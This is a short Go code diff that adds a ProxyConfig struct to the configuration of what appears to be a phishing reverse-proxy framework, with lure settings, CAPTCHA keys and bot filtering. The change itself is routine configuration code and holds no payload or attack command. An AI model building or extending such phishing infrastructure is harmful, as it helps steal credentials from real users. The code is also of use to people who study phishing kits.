@@ -26,10 +26,20 @@ type Lure struct {
 	OgUrl           string `mapstructure:"og_url" yaml:"og_url"`
 }
 
+type ProxyConfig struct {
+	Enabled  bool   `mapstructure:"enabled" yaml:"enabled"`
+	Type     string `mapstructure:"type" yaml:"type"`
+	Address  string `mapstructure:"address" yaml:"address"`
+	Port     int    `mapstructure:"port" yaml:"port"`
+	Username string `mapstructure:"username" yaml:"username"`
+	Password string `mapstructure:"password" yaml:"password"`
+}
+
 type Config struct {
 	siteDomains       map[string]string
 	baseDomain        string
 	serverIP          string
+	proxyConfig       *ProxyConfig
 	proxyType         string
 	proxyAddress      string
 	proxyPort         int
@@ -61,6 +71,7 @@ type Config struct {
 	turnstile_privkey string
 	recaptcha_sitekey string
 	recaptcha_privkey string
+	
 }
 
 const (
@@ -147,6 +158,15 @@ func NewConfig(cfg_dir, path string) (*Config, error) {
 	c.proxyEnabled = c.cfg.GetBool(CFG_PROXY_ENABLED)
 	c.proxySession = c.cfg.GetBool(CFG_PROXY_SESSION)
 	c.blackListMode = c.cfg.GetString(CFG_BLACKLIST_MODE)
+	//
+	c.proxyConfig = &ProxyConfig{
+	Enabled:  c.proxyEnabled,
+	Type:     c.proxyType,
+	Address:  c.proxyAddress,
+	Port:     c.proxyPort,
+	Username: c.proxyUsername,
+	Password: c.proxyPassword,
+}
 	//
 	c.simplebotEnabled = c.cfg.GetBool(CFG_SIMPLEBOT_ENABLED)
 	c.nkpbotEnabled = c.cfg.GetBool(CFG_NKPBOT_ENABLED)
